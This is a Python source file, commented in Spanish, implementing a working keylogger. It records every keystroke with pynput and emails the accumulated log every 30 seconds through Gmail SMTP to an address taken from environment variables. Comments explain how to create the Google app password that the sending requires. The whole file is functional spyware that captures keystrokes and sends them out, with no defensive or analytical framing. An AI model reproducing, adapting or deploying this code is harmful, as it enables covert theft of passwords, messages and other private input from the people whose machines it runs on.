#!/usr/bin/env python3

import smtplib
import threading
from email.mime.text import MIMEText
from os import getenv

import pynput.keyboard
from dotenv import load_dotenv
from termcolor import colored

load_dotenv()

GMAIL_PASS = getenv("APPPASS", "")
SENDER_MAIL = getenv("SENDER_MAIL", "")
RECIPE_MAIL = getenv("RECIPE_MAIL", "")


class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):

        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {
                key.space: " ",
                key.backspace: " Backspace ",
                key.enter: " Enter ",
                key.shift: " Shift ",
                key.ctrl: " Ctrl ",
                key.alt: " Alt ",
            }
            self.log += special_keys.get(key, f" {str(key)} ")

        print(self.log)

    # NOTE: Send emails
    def send_email(self, subject, body, sender, recipients, password):
        if True:
            print(
                colored(
                    f"[+] Enviando correo...\nfrom: {sender}\nto:{recipients}\ncontent:{body}\n"
                )
            )

        # INFO: la contrasena se crea entando a gmail/gestionar cuenta de google/seguridad/verificacion en dos pasos/contrasena de aplicaciones y ahi esta la password
        # WARN: se requiere clave de app de google para su uso.
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = sender
        msg["To"] = ", ".join(recipients)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Message sent!\n")

    def report(self):
        email_body = (
            "[+] El keylogger se ha iniciado exitosamente"
            if self.is_first_run
            else self.log
        )

        self.send_email(
            "keylogger Report",
            email_body,
            SENDER_MAIL,
            [RECIPE_MAIL],
            GMAIL_PASS,
        )
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        # NOTE: Crea un timer con threading y ejecuta cada 5 seg la funcion report
        if not self.request_shutdown:
            # HACK: Theading.Timer(tiempo[seg], funcion()) -> Ejecuta una funcion cada x tiempo
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            # NOTE: Cancelar hilo
            self.timer.cancel()

    def start(self):
        # NOTE: Arrancando el listerner
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
